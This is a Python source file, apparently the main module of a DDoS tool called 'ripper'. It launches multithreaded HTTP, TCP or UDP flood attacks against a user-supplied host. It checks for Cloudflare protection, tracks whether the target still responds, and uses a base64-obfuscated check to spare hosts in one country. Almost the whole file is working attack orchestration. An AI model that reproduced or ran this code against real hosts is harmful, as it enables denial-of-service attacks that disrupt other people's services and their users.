import os
import threading
import socket
import time
import sys
from optparse import OptionParser
from base64 import b64decode
from typing import List
from datetime import datetime
from ripper.context import Context
from ripper.attacks import down_it_http, down_it_tcp, down_it_udp
from ripper.common import (readfile, get_current_ip, get_no_successful_connection_error_msg, get_host_country,
                           __isCloudFlareProtected, print_usage, parse_args)
from ripper.constants import SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC, USAGE, EPILOG
from ripper.statistics import show_info

_ctx = Context()


def create_thread_pool(_ctx: Context) -> list:
    thread_pool = []
    for i in range(int(_ctx.threads)):
        if _ctx.attack_method == 'http':
            thread_pool.append(threading.Thread(target=down_it_http, args=[_ctx]))
        elif _ctx.attack_method == 'tcp':
            thread_pool.append(threading.Thread(target=down_it_tcp, args=[_ctx]))
        else:  # _ctx.attack_method == 'udp':
            thread_pool.append(threading.Thread(target=down_it_udp, args=[_ctx]))

        thread_pool[i].daemon = True  # if thread is exist, it dies
        thread_pool[i].start()

    return thread_pool


def update_url(_ctx: Context):
    _ctx.url = f"{_ctx.protocol}{_ctx.host}:{_ctx.port}"


def init_context(_ctx: Context, args):
    """Initialize Context from Input args."""
    _ctx.host = args[0].host
    _ctx.host_ip = ''
    _ctx.original_host = args[0].host
    _ctx.port = args[0].port
    _ctx.protocol = 'https://' if args[0].port == 443 else 'http://'
    update_url(_ctx)

    _ctx.threads = args[0].threads

    _ctx.attack_method = str(args[0].attack_method).lower()
    _ctx.random_packet_len = bool(args[0].random_packet_len)
    _ctx.max_random_packet_len = int(args[0].max_random_packet_len)
    _ctx.cpu_count = max(os.cpu_count(), 1)  # to avoid situation when vCPU might be 0

    _ctx.user_agents = readfile(os.path.dirname(__file__) + '/useragents.txt')
    _ctx.base_headers = readfile(os.path.dirname(__file__) + '/headers.txt')
    _ctx.headers = get_headers_dict(_ctx.base_headers)

    _ctx.isCloudflareProtected = __isCloudFlareProtected(_ctx.host, _ctx.user_agents)
    _ctx.start_time = datetime.now()


def get_headers_dict(base_headers: List[str]):
    """Set headers for the request"""
    headers_dict = {}
    for line in base_headers:
        parts = line.split(':')
        headers_dict[parts[0]] = parts[1].strip()

    return headers_dict


def update_host_ip(_ctx: Context):
    """Gets target's IP by host"""
    try:
        _ctx.host_ip = socket.gethostbyname(_ctx.host)
        _ctx.target_country = get_host_country(_ctx.host_ip)
    except:
        pass


def update_current_ip(_ctx: Context):
    """Updates current ip"""
    _ctx.getting_ip_in_progress = True
    _ctx.current_ip = get_current_ip()
    _ctx.getting_ip_in_progress = False
    if _ctx.start_ip == '':
        _ctx.start_ip = _ctx.current_ip


def connect_host(_ctx: Context):
    _ctx.connecting_host = True
    try:
        sock = _ctx.sock_manager.create_tcp_socket()
        sock.connect((_ctx.host, _ctx.port))
    except:
        _ctx.connections_failed += 1
    else:
        _ctx.connections_success += 1
        sock.close()
    _ctx.connecting_host = False


def check_successful_connections(_ctx: Context):
    """Checks if there are no successful connections more than SUCCESSFUL_CONNECTIONS_CHECK_PERIOD sec."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
    error_msg = get_no_successful_connection_error_msg()
    if _ctx.connections_success == _ctx.connections_success_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if error_msg not in _ctx.errors:
                _ctx.errors.append(error_msg)
    else:
        _ctx.connections_check_time = curr_ms
        _ctx.connections_success_prev = _ctx.connections_success
        if error_msg in _ctx.errors:
            _ctx.errors.remove(error_msg)


def check_successful_tcp_attack(_ctx: Context):
    """Checks if there are changes in sended bytes count."""
    curr_ms = time.time_ns()
    diff_sec = (curr_ms - _ctx.connections_check_time) / 1000000 / 1000
    error_msg = get_no_successful_connection_error_msg()
    if _ctx.packets_sent == _ctx.packets_sent_prev:
        if diff_sec > SUCCESSFUL_CONNECTIONS_CHECK_PERIOD_SEC:
            if error_msg not in _ctx.errors:
                _ctx.errors.append(error_msg)
    else:
        _ctx.connections_check_time = curr_ms
        _ctx.packets_sent_prev = _ctx.packets_sent
        if error_msg in _ctx.errors:
            _ctx.errors.remove(error_msg)


def go_home(_ctx: Context):
    """Modifies host to match the rules"""
    home_code = b64decode('dWE=').decode('utf-8')
    if _ctx.host.endswith('.' + home_code.lower()) or get_host_country(_ctx.host_ip) in home_code.upper():
        _ctx.host_ip = _ctx.host = 'localhost'
        _ctx.original_host += '*'
        update_url(_ctx)


def validate_input(args):
    """Validates input params."""
    if int(args.port) < 0:
        print(f'Wrong port number.')
        return False

    if int(args.threads) < 1:
        print(f'Wrong threads number.')
        return False

    if not args.host:
        print(f'Host wasn\'t detected')
        return False

    if args.attack_method not in ('udp', 'tcp', 'http'):
        print(f'Wrong attack type. Possible options: udp, tcp, http.')
        return False

    return True


def validate_context(_ctx: Context):
    """Validates context"""
    if len(_ctx.host_ip) < 1 or _ctx.host_ip == '0.0.0.0':
        print(f'Could not connect to the host')
        return False

    return True


def connect_host_loop(_ctx: Context, timeout_secs: int = 3) -> None:
    """Tries to connect host in permanent loop."""
    while True:
        connect_host(_ctx)
        time.sleep(timeout_secs)


def main():
    """The main function to run the script from the command line."""
    parser = OptionParser(usage=USAGE, epilog=EPILOG)
    args = parse_args(parser)

    if len(sys.argv) < 2 or not validate_input(args[0]):
        print_usage(parser)

    init_context(_ctx, args)
    update_host_ip(_ctx)
    update_current_ip(_ctx)
    _ctx.country = get_host_country(_ctx.current_ip)
    go_home(_ctx)

    if not validate_context(_ctx):
        sys.exit()

    connect_host(_ctx)

    time.sleep(1)
    show_info(_ctx)

    _ctx.connections_check_time = time.time_ns()

    create_thread_pool(_ctx)

    if _ctx.attack_method == 'udp' and _ctx.port:
        thread = threading.Thread(target=connect_host_loop, args=[_ctx])
        thread.daemon = True
        thread.start()

    while True:
        time.sleep(1)
